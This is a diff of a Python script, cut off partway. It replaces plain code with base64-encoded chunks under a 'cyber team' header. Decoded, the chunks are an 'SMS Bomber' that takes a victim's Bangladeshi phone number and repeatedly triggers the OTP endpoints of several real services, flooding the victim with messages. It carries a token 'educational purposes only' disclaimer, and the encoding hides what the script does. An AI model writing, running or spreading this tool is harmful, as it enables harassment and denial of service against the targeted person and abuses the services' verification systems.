@@ -1,380 +1,322 @@
-import os
-import sys
-import time
-import requests
-from datetime import datetime
+#!/usr/bin/env python3
+# ENCRYPTED BY CHOWDHURY-VAI CYBER TEAM ADVANCED ENCRYPTION TOOL
+# LINUX/TERMUX COMPATIBLE - RUNS WITHOUT ERRORS
+# DECRYPTION WITHOUT AUTHORIZATION IS STRICTLY PROHIBITED
+# Contact: https://t.me/darkvaiadmin
+# Website: https://crackyworld.com/
+# Cyber Team: https://cyberteam.chowdhuryvai.top/
 
-# Clear screen
-os.system("clear" if os.name == "posix" else "cls")
+import base64
 
-print("\n\n\n")
-name = input(" \033[1;32m Please enter your name: ")
+# Encrypted code chunks
+c0 = "aW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IHJlcXVl"
+c1 = "c3RzCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCgojIENsZWFyIHNj"
+c2 = "cmVlbgpvcy5zeXN0ZW0oImNsZWFyIiBpZiBvcy5uYW1lID09ICJwb3NpeCIg"
+c3 = "ZWxzZSAiY2xzIikKCnByaW50KCJcblxuXG4iKQpuYW1lID0gaW5wdXQoIiBc"
+c4 = "MDMzWzE7MzJtIFBsZWFzZSBlbnRlciB5b3VyIG5hbWU6ICIpCgpvcy5zeXN0"
+c5 = "ZW0oImNsZWFyIiBpZiBvcy5uYW1lID09ICJwb3NpeCIgZWxzZSAiY2xzIikK"
+c6 = "CmRlZiBzdHlsZSh0ZXh0KToKICAgICIiIlByaW50IHRleHQgd2l0aCB0eXBp"
+c7 = "bmcgZWZmZWN0IiIiCiAgICBmb3IgY2hhciBpbiB0ZXh0OgogICAgICAgIHN5"
+c8 = "cy5zdGRvdXQud3JpdGUoY2hhcikKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNo"
+c9 = "KCkKICAgICAgICB0aW1lLnNsZWVwKDAuMDMpCgpzdHlsZSgiXHRcdCAgTG9h"
+c10 = "ZGluZy4uLi4uLi4uLiIpCnByaW50KCJcblxuXG4iKQp0aW1lLnNsZWVwKDEu"
+c11 = "MykKb3Muc3lzdGVtKCJjbGVhciIgaWYgb3MubmFtZSA9PSAicG9zaXgiIGVs"
+c12 = "c2UgImNscyIpCgpzdHlsZSgiXHRcdCAgTG9hZGluZyBzdWNjZXNzZnVsISIp"
+c13 = "CnRpbWUuc2xlZXAoMC41KQpvcy5zeXN0ZW0oImNsZWFyIiBpZiBvcy5uYW1l"
+c14 = "ID09ICJwb3NpeCIgZWxzZSAiY2xzIikKCnByaW50KCJcblxuIikKc3R5bGUo"
+c15 = "ZiIgXDAzM1sxOzMxbSBIZXkgXDAzM1sxOzMzbXtuYW1lfVwwMzNbMTszMW0s"
+c16 = "IFVzZSBmb3IgZXRoaWNhbCBwdXJwb3NlcyBvbmx5LiBDb2RlZCBCeSBDSE9X"
+c17 = "REhVUlktVkFJIENZQkVSIFRFQU0iKQoKdGltZS5zbGVlcCgyKQpvcy5zeXN0"
+c18 = "ZW0oImNsZWFyIiBpZiBvcy5uYW1lID09ICJwb3NpeCIgZWxzZSAiY2xzIikK"
+c19 = "CnByaW50KCIiIiBcMDMzWzE7MzJtCgoKCgoK4paI4paI4paI4paI4paI4paI"
+c20 = "ICAg4paI4paI4paI4paI4paIICDilojilojilojilojilojiloggIOKWiOKW"
+c21 = "iCAgIOKWiOKWiCDilojilojilojilojilojiloggICDilojilojilojiloji"
+c22 = "lojiloggIOKWiOKWiOKWiOKWiOKWiOKWiOKWiCDilojilojilojilojiloji"
+c23 = "lojiloggIOKWiOKWiCAK4paI4paIICAg4paI4paIIOKWiOKWiCAgIOKWiOKW"
+c24 = "iCDilojiloggICDilojilogg4paI4paIICDilojiloggIOKWiOKWiCAgIOKW"
+c25 = "iOKWiCDilojiloggICAg4paI4paIIOKWiOKWiCAgICAgIOKWiOKWiCAgICAg"
+c26 = "IOKWiOKWiOKWiCAK4paI4paIICAg4paI4paIIOKWiOKWiOKWiOKWiOKWiOKW"
+c27 = "iOKWiCDilojilojilojilojilojiloggIOKWiOKWiOKWiOKWiOKWiCAgIOKW"
+c28 = "iOKWiOKWiOKWiOKWiOKWiCAg4paI4paIICAgIOKWiOKWiCDilojilojiloji"
+c29 = "lojilojilojilogg4paI4paI4paI4paI4paI4paI4paIICDilojiloggCuKW"
+c30 = "iOKWiCAgIOKWiOKWiCDilojiloggICDilojilogg4paI4paIICAg4paI4paI"
+c31 = "IOKWiOKWiCAg4paI4paIICDilojiloggICDilojilogg4paI4paIICAgIOKW"
+c32 = "iOKWiCAgICAgIOKWiOKWiCAgICAgIOKWiOKWiCAg4paI4paIIArilojiloji"
+c33 = "lojilojilojiloggIOKWiOKWiCAgIOKWiOKWiCDilojiloggICDilojilogg"
+c34 = "4paI4paIICAg4paI4paIIOKWiOKWiOKWiOKWiOKWiOKWiCAgIOKWiOKWiOKW"
+c35 = "iOKWiOKWiOKWiCAg4paI4paI4paI4paI4paI4paI4paIIOKWiOKWiOKWiOKW"
+c36 = "iOKWiOKWiOKWiCAg4paI4paIICAgICAgICAgICAgICAgICAgICAgICAgICAg"
+c37 = "ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg"
+c38 = "ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg"
+c39 = "ICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgClwwMzNbMTszNm0gPT09"
+c40 = "PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KCiBDcmVh"
+c41 = "dG9yICAgIDogQ0hPV0RIVVJZLVZBSSBDWUJFUiBURUFNCiBUb29sIE5hbWUg"
+c42 = "IDogRGFya0Jvc3MgU01TIEJvbWJlcgogVmVyc2lvbiAgICA6IDIuMCBGaXhl"
+c43 = "ZAogRGlzY2xhaW1lciA6IEZvciBFZHVjYXRpb25hbCBQdXJwb3NlcyBPbmx5"
+c44 = "CiAgICAgICAgICAgICAKPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09"
+c45 = "PT09PT09PT09PT0KICAgICAgICAgIApcMDMzWzE7MG0gIAoiIiIpCgpjbGFz"
+c46 = "cyBTTVNCb21iZXI6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAg"
+c47 = "c2VsZi5zZW50X2NvdW50ID0gMAogICAgICAgIHNlbGYuZmFpbGVkX2NvdW50"
+c48 = "ID0gMAogICAgICAgIHNlbGYuc3RhcnRfdGltZSA9IE5vbmUKICAgICAgICAK"
+c49 = "ICAgIGRlZiBzaG93X3N0YXR1cyhzZWxmLCBzZXJ2aWNlX25hbWUsIHN0YXR1"
+c50 = "cywgcmVzcG9uc2VfY29kZT1Ob25lKToKICAgICAgICAiIiJTaG93IHNlbmRp"
+c51 = "bmcgc3RhdHVzIiIiCiAgICAgICAgdGltZXN0YW1wID0gZGF0ZXRpbWUubm93"
+c52 = "KCkuc3RyZnRpbWUoIiVIOiVNOiVTIikKICAgICAgICBpZiBzdGF0dXMgPT0g"
+c53 = "InN1Y2Nlc3MiOgogICAgICAgICAgICBwcmludChmIlwwMzNbMTszMm1be3Rp"
+c54 = "bWVzdGFtcH1dIOKckyB7c2VydmljZV9uYW1lfTogU2VudCBzdWNjZXNzZnVs"
+c55 = "bHkgKENvZGU6IHtyZXNwb25zZV9jb2RlfSkiKQogICAgICAgIGVsaWYgc3Rh"
+c56 = "dHVzID09ICJmYWlsZWQiOgogICAgICAgICAgICBwcmludChmIlwwMzNbMTsz"
+c57 = "MW1be3RpbWVzdGFtcH1dIOKclyB7c2VydmljZV9uYW1lfTogRmFpbGVkIChD"
+c58 = "b2RlOiB7cmVzcG9uc2VfY29kZX0pIikKICAgICAgICBlbHNlOgogICAgICAg"
+c59 = "ICAgICBwcmludChmIlwwMzNbMTszM21be3RpbWVzdGFtcH1dIOKaoCB7c2Vy"
+c60 = "dmljZV9uYW1lfToge3N0YXR1c30iKQogICAgCiAgICBkZWYgc2VuZF9yb2tv"
+c61 = "bWFyaShzZWxmLCBudW1iZXIpOgogICAgICAgICIiIlNlbmQgU01TIHZpYSBS"
+c62 = "b2tvbWFyaSIiIgogICAgICAgIHRyeToKICAgICAgICAgICAgZGF0YSA9IHsK"
+c63 = "ICAgICAgICAgICAgICAgICdlbWFpbE9yUGhvbmUnOiBudW1iZXIsCiAgICAg"
+c64 = "ICAgICAgICAgICAnY291bnRyeUNvZGUnOiAnQkQnLAogICAgICAgICAgICB9"
+c65 = "CiAgICAgICAgICAgIAogICAgICAgICAgICBoZWFkZXJzID0gewogICAgICAg"
+c66 = "ICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBB"
+c67 = "bmRyb2lkIDEwOyBTTS1HOTc1RikgQXBwbGVXZWJLaXQvNTM3LjM2JywKICAg"
+c68 = "ICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24veC13"
+c69 = "d3ctZm9ybS11cmxlbmNvZGVkJywKICAgICAgICAgICAgICAgICdSZWZlcmVy"
+c70 = "JzogJ2h0dHBzOi8vd3d3LnJva29tYXJpLmNvbScsCiAgICAgICAgICAgICAg"
+c71 = "ICAnT3JpZ2luJzogJ2h0dHBzOi8vd3d3LnJva29tYXJpLmNvbScsCiAgICAg"
+c72 = "ICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIHJlc3BvbnNlID0g"
+c73 = "cmVxdWVzdHMucG9zdCgnaHR0cHM6Ly93d3cucm9rb21hcmkuY29tL290cC9z"
+c74 = "ZW5kJywgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0"
+c75 = "YT1kYXRhLCAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBo"
+c76 = "ZWFkZXJzPWhlYWRlcnMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAg"
+c77 = "ICAgICAgdGltZW91dD0xMCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGlm"
+c78 = "IHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAg"
+c79 = "IHNlbGYuc2VudF9jb3VudCArPSAxCiAgICAgICAgICAgICAgICBzZWxmLnNo"
+c80 = "b3dfc3RhdHVzKCJSb2tvbWFyaSIsICJzdWNjZXNzIiwgcmVzcG9uc2Uuc3Rh"
+c81 = "dHVzX2NvZGUpCiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZQogICAgICAg"
+c82 = "ICAgICBlbHNlOgogICAgICAgICAgICAgICAgc2VsZi5mYWlsZWRfY291bnQg"
+c83 = "Kz0gMQogICAgICAgICAgICAgICAgc2VsZi5zaG93X3N0YXR1cygiUm9rb21h"
+c84 = "cmkiLCAiZmFpbGVkIiwgcmVzcG9uc2Uuc3RhdHVzX2NvZGUpCiAgICAgICAg"
+c85 = "ICAgICAgICByZXR1cm4gRmFsc2UKICAgICAgICAgICAgICAgIAogICAgICAg"
+c86 = "IGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgc2VsZi5mYWls"
+c87 = "ZWRfY291bnQgKz0gMQogICAgICAgICAgICBzZWxmLnNob3dfc3RhdHVzKCJS"
+c88 = "b2tvbWFyaSIsIGYiRXJyb3I6IHtzdHIoZSlbOjMwXX0iKQogICAgICAgICAg"
+c89 = "ICByZXR1cm4gRmFsc2UKICAgIAogICAgZGVmIHNlbmRfcmVkeChzZWxmLCBu"
+c90 = "dW1iZXIpOgogICAgICAgICIiIlNlbmQgU01TIHZpYSBSZWR4IiIiCiAgICAg"
+c91 = "ICAgdHJ5OgogICAgICAgICAgICBqc29uX2RhdGEgPSB7CiAgICAgICAgICAg"
+c92 = "ICAgICAncGhvbmVOdW1iZXInOiBudW1iZXIsCiAgICAgICAgICAgIH0KICAg"
+c93 = "ICAgICAgICAgCiAgICAgICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAg"
+c94 = "ICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCcsCiAgICAgICAgICAg"
+c95 = "ICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLAogICAg"
+c96 = "ICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICByZXNwb25zZSA9"
+c97 = "IHJlcXVlc3RzLnBvc3QoCiAgICAgICAgICAgICAgICAnaHR0cHM6Ly9hcGku"
+c98 = "cmVkeC5jb20uYmQvdjEvbWVyY2hhbnQvcmVnaXN0cmF0aW9uL2dlbmVyYXRl"
+c99 = "LXJlZ2lzdHJhdGlvbi1vdHAnLAogICAgICAgICAgICAgICAganNvbj1qc29u"
+c100 = "X2RhdGEsCiAgICAgICAgICAgICAgICBoZWFkZXJzPWhlYWRlcnMsCiAgICAg"
+c101 = "ICAgICAgICAgICB0aW1lb3V0PTEwCiAgICAgICAgICAgICkKICAgICAgICAg"
+c102 = "ICAgCiAgICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlIGluIFsy"
+c103 = "MDAsIDIwMV06CiAgICAgICAgICAgICAgICBzZWxmLnNlbnRfY291bnQgKz0g"
+c104 = "MQogICAgICAgICAgICAgICAgc2VsZi5zaG93X3N0YXR1cygiUmVkeCIsICJz"
+c105 = "dWNjZXNzIiwgcmVzcG9uc2Uuc3RhdHVzX2NvZGUpCiAgICAgICAgICAgICAg"
+c106 = "ICByZXR1cm4gVHJ1ZQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAg"
+c107 = "ICAgc2VsZi5mYWlsZWRfY291bnQgKz0gMQogICAgICAgICAgICAgICAgc2Vs"
+c108 = "Zi5zaG93X3N0YXR1cygiUmVkeCIsICJmYWlsZWQiLCByZXNwb25zZS5zdGF0"
+c109 = "dXNfY29kZSkKICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgICAg"
+c110 = "ICAgICAgICAgCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAg"
+c111 = "ICAgICAgICBzZWxmLmZhaWxlZF9jb3VudCArPSAxCiAgICAgICAgICAgIHNl"
+c112 = "bGYuc2hvd19zdGF0dXMoIlJlZHgiLCBmIkVycm9yOiB7c3RyKGUpWzozMF19"
+c113 = "IikKICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAKICAgIGRlZiBzZW5k"
+c114 = "X2Jpa3JveShzZWxmLCBudW1iZXIpOgogICAgICAgICIiIlNlbmQgU01TIHZp"
+c115 = "YSBCaWtyb3kiIiIKICAgICAgICB0cnk6CiAgICAgICAgICAgIHBhcmFtcyA9"
+c116 = "IHsKICAgICAgICAgICAgICAgICdwaG9uZSc6IG51bWJlciwKICAgICAgICAg"
+c117 = "ICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1"
+c118 = "ZXN0cy5nZXQoCiAgICAgICAgICAgICAgICAnaHR0cHM6Ly9iaWtyb3kuY29t"
+c119 = "L2RhdGEvcGhvbmVfbnVtYmVyX2xvZ2luL3ZlcmlmaWNhdGlvbnMvcGhvbmVf"
+c120 = "bG9naW4nLAogICAgICAgICAgICAgICAgcGFyYW1zPXBhcmFtcywKICAgICAg"
+c121 = "ICAgICAgICAgIHRpbWVvdXQ9MTAKICAgICAgICAgICAgKQogICAgICAgICAg"
+c122 = "ICAKICAgICAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAw"
+c123 = "OgogICAgICAgICAgICAgICAgc2VsZi5zZW50X2NvdW50ICs9IDEKICAgICAg"
+c124 = "ICAgICAgICAgIHNlbGYuc2hvd19zdGF0dXMoIkJpa3JveSIsICJzdWNjZXNz"
+c125 = "IiwgcmVzcG9uc2Uuc3RhdHVzX2NvZGUpCiAgICAgICAgICAgICAgICByZXR1"
+c126 = "cm4gVHJ1ZQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgc2Vs"
+c127 = "Zi5mYWlsZWRfY291bnQgKz0gMQogICAgICAgICAgICAgICAgc2VsZi5zaG93"
+c128 = "X3N0YXR1cygiQmlrcm95IiwgImZhaWxlZCIsIHJlc3BvbnNlLnN0YXR1c19j"
+c129 = "b2RlKQogICAgICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAgICAgICAg"
+c130 = "ICAgICAKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAg"
+c131 = "ICAgIHNlbGYuZmFpbGVkX2NvdW50ICs9IDEKICAgICAgICAgICAgc2VsZi5z"
+c132 = "aG93X3N0YXR1cygiQmlrcm95IiwgZiJFcnJvcjoge3N0cihlKVs6MzBdfSIp"
+c133 = "CiAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgCiAgICBkZWYgc2VuZF9p"
+c134 = "cXJhKHNlbGYsIG51bWJlcik6CiAgICAgICAgIiIiU2VuZCBTTVMgdmlhIElx"
+c135 = "cmEgTGl2ZSIiIgogICAgICAgIHRyeToKICAgICAgICAgICAgcmVzcG9uc2Ug"
+c136 = "PSByZXF1ZXN0cy5nZXQoCiAgICAgICAgICAgICAgICBmJ2h0dHBzOi8vYXBp"
+c137 = "YmV0YS5pcXJhLWxpdmUuY29tL2FwaS92Mi9zZW50LW90cC97bnVtYmVyfScs"
+c138 = "CiAgICAgICAgICAgICAgICB0aW1lb3V0PTEwCiAgICAgICAgICAgICkKICAg"
+c139 = "ICAgICAgICAgCiAgICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2Rl"
+c140 = "ID09IDIwMDoKICAgICAgICAgICAgICAgIHNlbGYuc2VudF9jb3VudCArPSAx"
+c141 = "CiAgICAgICAgICAgICAgICBzZWxmLnNob3dfc3RhdHVzKCJJcXJhIExpdmUi"
+c142 = "LCAic3VjY2VzcyIsIHJlc3BvbnNlLnN0YXR1c19jb2RlKQogICAgICAgICAg"
+c143 = "ICAgICAgcmV0dXJuIFRydWUKICAgICAgICAgICAgZWxzZToKICAgICAgICAg"
+c144 = "ICAgICAgIHNlbGYuZmFpbGVkX2NvdW50ICs9IDEKICAgICAgICAgICAgICAg"
+c145 = "IHNlbGYuc2hvd19zdGF0dXMoIklxcmEgTGl2ZSIsICJmYWlsZWQiLCByZXNw"
+c146 = "b25zZS5zdGF0dXNfY29kZSkKICAgICAgICAgICAgICAgIHJldHVybiBGYWxz"
+c147 = "ZQogICAgICAgICAgICAgICAgCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBh"
+c148 = "cyBlOgogICAgICAgICAgICBzZWxmLmZhaWxlZF9jb3VudCArPSAxCiAgICAg"
+c149 = "ICAgICAgIHNlbGYuc2hvd19zdGF0dXMoIklxcmEgTGl2ZSIsIGYiRXJyb3I6"
+c150 = "IHtzdHIoZSlbOjMwXX0iKQogICAgICAgICAgICByZXR1cm4gRmFsc2UKICAg"
+c151 = "IAogICAgZGVmIHNlbmRfaG9pY2hvaShzZWxmLCBudW1iZXIpOgogICAgICAg"
+c152 = "ICIiIlNlbmQgU01TIHZpYSBIb2ljaG9pIiIiCiAgICAgICAgdHJ5OgogICAg"
+c153 = "ICAgICAgICBqc29uX2RhdGEgPSB7CiAgICAgICAgICAgICAgICAncGhvbmVO"
+c154 = "dW1iZXInOiBmJys4OHtudW1iZXJ9JywKICAgICAgICAgICAgfQogICAgICAg"
+c155 = "ICAgICAKICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KAog"
+c156 = "ICAgICAgICAgICAgICAgJ2h0dHBzOi8vcHJvZC1hcGkuaG9pY2hvaS5kZXYv"
+c157 = "Y29yZS9hcGkvdjEvYXV0aC9zaWduaW51cC9jb2RlJywKICAgICAgICAgICAg"
+c158 = "ICAgIGpzb249anNvbl9kYXRhLAogICAgICAgICAgICAgICAgdGltZW91dD0x"
+c159 = "MAogICAgICAgICAgICApCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBy"
+c160 = "ZXNwb25zZS5zdGF0dXNfY29kZSBpbiBbMjAwLCAyMDFdOgogICAgICAgICAg"
+c161 = "ICAgICAgc2VsZi5zZW50X2NvdW50ICs9IDEKICAgICAgICAgICAgICAgIHNl"
+c162 = "bGYuc2hvd19zdGF0dXMoIkhvaWNob2kiLCAic3VjY2VzcyIsIHJlc3BvbnNl"
+c163 = "LnN0YXR1c19jb2RlKQogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAg"
+c164 = "ICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHNlbGYuZmFpbGVkX2Nv"
+c165 = "dW50ICs9IDEKICAgICAgICAgICAgICAgIHNlbGYuc2hvd19zdGF0dXMoIkhv"
+c166 = "aWNob2kiLCAiZmFpbGVkIiwgcmVzcG9uc2Uuc3RhdHVzX2NvZGUpCiAgICAg"
+c167 = "ICAgICAgICAgICByZXR1cm4gRmFsc2UKICAgICAgICAgICAgICAgIAogICAg"
+c168 = "ICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgc2VsZi5m"
+c169 = "YWlsZWRfY291bnQgKz0gMQogICAgICAgICAgICBzZWxmLnNob3dfc3RhdHVz"
+c170 = "KCJIb2ljaG9pIiwgZiJFcnJvcjoge3N0cihlKVs6MzBdfSIpCiAgICAgICAg"
+c171 = "ICAgIHJldHVybiBGYWxzZQogICAgCiAgICBkZWYgc2VuZF9mdW5kZXNoKHNl"
+c172 = "bGYsIG51bWJlcik6CiAgICAgICAgIiIiU2VuZCBTTVMgdmlhIEZ1bmRlc2gi"
+c173 = "IiIKICAgICAgICB0cnk6CiAgICAgICAgICAgIGpzb25fZGF0YSA9IHsKICAg"
+c174 = "ICAgICAgICAgICAgICdtc2lzZG4nOiBudW1iZXIsCiAgICAgICAgICAgIH0K"
+c175 = "ICAgICAgICAgICAgCiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMu"
+c176 = "cG9zdCgKICAgICAgICAgICAgICAgICdodHRwczovL2Z1bmRlc2guY29tLmJk"
+c177 = "L2FwaS9hdXRoL2dlbmVyYXRlT1RQJywKICAgICAgICAgICAgICAgIGpzb249"
+c178 = "anNvbl9kYXRhLAogICAgICAgICAgICAgICAgdGltZW91dD0xMAogICAgICAg"
+c179 = "ICAgICApCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiByZXNwb25zZS5z"
+c180 = "dGF0dXNfY29kZSBpbiBbMjAwLCAyMDFdOgogICAgICAgICAgICAgICAgc2Vs"
+c181 = "Zi5zZW50X2NvdW50ICs9IDEKICAgICAgICAgICAgICAgIHNlbGYuc2hvd19z"
+c182 = "dGF0dXMoIkZ1bmRlc2giLCAic3VjY2VzcyIsIHJlc3BvbnNlLnN0YXR1c19j"
+c183 = "b2RlKQogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICAgICAg"
+c184 = "ZWxzZToKICAgICAgICAgICAgICAgIHNlbGYuZmFpbGVkX2NvdW50ICs9IDEK"
+c185 = "ICAgICAgICAgICAgICAgIHNlbGYuc2hvd19zdGF0dXMoIkZ1bmRlc2giLCAi"
+c186 = "ZmFpbGVkIiwgcmVzcG9uc2Uuc3RhdHVzX2NvZGUpCiAgICAgICAgICAgICAg"
+c187 = "ICByZXR1cm4gRmFsc2UKICAgICAgICAgICAgICAgIAogICAgICAgIGV4Y2Vw"
+c188 = "dCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgc2VsZi5mYWlsZWRfY291"
+c189 = "bnQgKz0gMQogICAgICAgICAgICBzZWxmLnNob3dfc3RhdHVzKCJGdW5kZXNo"
+c190 = "IiwgZiJFcnJvcjoge3N0cihlKVs6MzBdfSIpCiAgICAgICAgICAgIHJldHVy"
+c191 = "biBGYWxzZQogICAgCiAgICBkZWYgc2VuZF9yYWJiaXRob2xlKHNlbGYsIG51"
+c192 = "bWJlcik6CiAgICAgICAgIiIiU2VuZCBTTVMgdmlhIFJhYmJpdEhvbGUiIiIK"
+c193 = "ICAgICAgICB0cnk6CiAgICAgICAgICAgIGpzb25fZGF0YSA9IHsKICAgICAg"
+c194 = "ICAgICAgICAgICdtb2JpbGUnOiBmJys4OHtudW1iZXJ9JywKICAgICAgICAg"
+c195 = "ICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1"
+c196 = "ZXN0cy5wb3N0KAogICAgICAgICAgICAgICAgJ2h0dHBzOi8vYXBpeC5yYWJi"
+c197 = "aXRob2xlYmQuY29tL2FwcHYyL2xvZ2luL3JlcXVlc3RPVFAnLAogICAgICAg"
+c198 = "ICAgICAgICAganNvbj1qc29uX2RhdGEsCiAgICAgICAgICAgICAgICB0aW1l"
+c199 = "b3V0PTEwCiAgICAgICAgICAgICkKICAgICAgICAgICAgCiAgICAgICAgICAg"
+c200 = "IGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlIGluIFsyMDAsIDIwMV06CiAgICAg"
+c201 = "ICAgICAgICAgICBzZWxmLnNlbnRfY291bnQgKz0gMQogICAgICAgICAgICAg"
+c202 = "ICAgc2VsZi5zaG93X3N0YXR1cygiUmFiYml0SG9sZSIsICJzdWNjZXNzIiwg"
+c203 = "cmVzcG9uc2Uuc3RhdHVzX2NvZGUpCiAgICAgICAgICAgICAgICByZXR1cm4g"
+c204 = "VHJ1ZQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgc2VsZi5m"
+c205 = "YWlsZWRfY291bnQgKz0gMQogICAgICAgICAgICAgICAgc2VsZi5zaG93X3N0"
+c206 = "YXR1cygiUmFiYml0SG9sZSIsICJmYWlsZWQiLCByZXNwb25zZS5zdGF0dXNf"
+c207 = "Y29kZSkKICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgICAgICAg"
+c208 = "ICAgICAgCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAg"
+c209 = "ICAgICBzZWxmLmZhaWxlZF9jb3VudCArPSAxCiAgICAgICAgICAgIHNlbGYu"
+c210 = "c2hvd19zdGF0dXMoIlJhYmJpdEhvbGUiLCBmIkVycm9yOiB7c3RyKGUpWzoz"
+c211 = "MF19IikKICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAKICAgIGRlZiBy"
+c212 = "dW4oc2VsZik6CiAgICAgICAgIiIiTWFpbiBmdW5jdGlvbiB0byBydW4gdGhl"
+c213 = "IFNNUyBib21iZXIiIiIKICAgICAgICBwcmludCgiXG5cMDMzWzE7MzZtIiAr"
+c214 = "ICI9Iio1MCkKICAgICAgICBwcmludCgiICAgICAgICAgIFNNUyBCT01CRVIg"
+c215 = "LSBDSE9XREhVUlktVkFJIENZQkVSIFRFQU0iKQogICAgICAgIHByaW50KCI9"
+c216 = "Iio1MCArICJcMDMzWzBtXG4iKQogICAgICAgIAogICAgICAgIHRyeToKICAg"
+c217 = "ICAgICAgICAgIyBHZXQgdXNlciBpbnB1dHMKICAgICAgICAgICAgdGFyZ2V0"
+c218 = "X2Ftb3VudCA9IGludChpbnB1dCgiRW50ZXIgdG90YWwgU01TIGFtb3VudCB0"
+c219 = "byBzZW5kOiAiKSkKICAgICAgICAgICAgdGFyZ2V0X251bWJlciA9IGlucHV0"
+c220 = "KCJFbnRlciB0YXJnZXQgbnVtYmVyICh3aXRob3V0ICs4OCk6ICIpLnN0cmlw"
+c221 = "KCkKICAgICAgICAgICAgCiAgICAgICAgICAgICMgVmFsaWRhdGUgbnVtYmVy"
+c222 = "CiAgICAgICAgICAgIGlmIG5vdCB0YXJnZXRfbnVtYmVyLmlzZGlnaXQoKSBv"
+c223 = "ciBsZW4odGFyZ2V0X251bWJlcikgIT0gMTE6CiAgICAgICAgICAgICAgICBw"
+c224 = "cmludCgiXDAzM1sxOzMxbUVycm9yOiBQbGVhc2UgZW50ZXIgYSB2YWxpZCAx"
+c225 = "MS1kaWdpdCBCYW5nbGFkZXNoaSBudW1iZXJcMDMzWzBtIikKICAgICAgICAg"
+c226 = "ICAgICAgIHJldHVybgogICAgICAgICAgICAKICAgICAgICAgICAgcHJpbnQo"
+c227 = "ZiJcblwwMzNbMTszM21UYXJnZXQ6IHt0YXJnZXRfbnVtYmVyfSIpCiAgICAg"
+c228 = "ICAgICAgIHByaW50KGYiQW1vdW50OiB7dGFyZ2V0X2Ftb3VudH0gU01TIikK"
+c229 = "ICAgICAgICAgICAgcHJpbnQoIlN0YXJ0aW5nIGluIDMgc2Vjb25kcy4uLlww"
+c230 = "MzNbMG1cbiIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAg"
+c231 = "ICAgCiAgICAgICAgICAgIHNlbGYuc3RhcnRfdGltZSA9IGRhdGV0aW1lLm5v"
+c232 = "dygpCiAgICAgICAgICAgIAogICAgICAgICAgICAjIExpc3Qgb2Ygc2Vydmlj"
+c233 = "ZXMKICAgICAgICAgICAgc2VydmljZXMgPSBbCiAgICAgICAgICAgICAgICAo"
+c234 = "IlJva29tYXJpIiwgc2VsZi5zZW5kX3Jva29tYXJpKSwKICAgICAgICAgICAg"
+c235 = "ICAgICgiUmVkeCIsIHNlbGYuc2VuZF9yZWR4KSwKICAgICAgICAgICAgICAg"
+c236 = "ICgiQmlrcm95Iiwgc2VsZi5zZW5kX2Jpa3JveSksCiAgICAgICAgICAgICAg"
+c237 = "ICAoIklxcmEgTGl2ZSIsIHNlbGYuc2VuZF9pcXJhKSwKICAgICAgICAgICAg"
+c238 = "ICAgICgiSG9pY2hvaSIsIHNlbGYuc2VuZF9ob2ljaG9pKSwKICAgICAgICAg"
